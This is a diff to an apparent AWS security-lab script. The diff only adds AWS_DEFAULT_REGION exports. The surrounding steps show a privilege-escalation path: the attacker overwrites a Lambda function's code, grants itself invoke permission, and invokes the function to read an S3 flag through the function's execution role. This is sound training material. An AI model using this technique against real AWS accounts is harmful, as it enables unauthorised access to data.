@@ -165,6 +165,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -183,6 +184,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -192,6 +194,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying starting user has no S3 access and no Lambda invoke permission${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Attempting to list target bucket contents (should fail)..."
 show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET/"
@@ -216,6 +219,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Getting target Lambda function details${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Target Lambda function: $TARGET_LAMBDA"
 
 show_cmd "ReadOnly" "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --query 'Configuration.FunctionArn' --output text"
@@ -289,6 +293,7 @@ echo -e "${GREEN}✓ Created malicious Lambda code${NC}\n"
 echo -e "${YELLOW}Step 7: Updating Lambda function with malicious code${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Using lambda:UpdateFunctionCode permission to replace the function's code..."
 
 show_attack_cmd "Attacker" "aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip"
@@ -306,6 +311,7 @@ echo -e "${GREEN}✓ Successfully updated Lambda function code${NC}\n"
 echo -e "${YELLOW}Waiting for Lambda code update to reach Successful state...${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 MAX_WAIT=60
 WAITED=0
 while [ "$WAITED" -lt "$MAX_WAIT" ]; do
@@ -330,6 +336,7 @@ fi
 echo -e "${YELLOW}Step 8: Adding resource-based permission to invoke the Lambda function${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Using lambda:AddPermission to grant our own user the right to invoke the function..."
 echo "Without this, even lambda:InvokeFunction in the identity policy is blocked by the absence of a resource policy."
 
@@ -351,6 +358,7 @@ echo -e "${GREEN}✓ Successfully added invoke permission for $STARTING_USER${NC
 echo -e "${YELLOW}Step 9: Invoking malicious Lambda function to read S3 flag${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "The Lambda will execute as $LAMBDA_EXEC_ROLE which has s3:GetObject on the target bucket..."
 echo "Passing the target bucket name in the event payload so the payload knows where to read the flag from..."
 
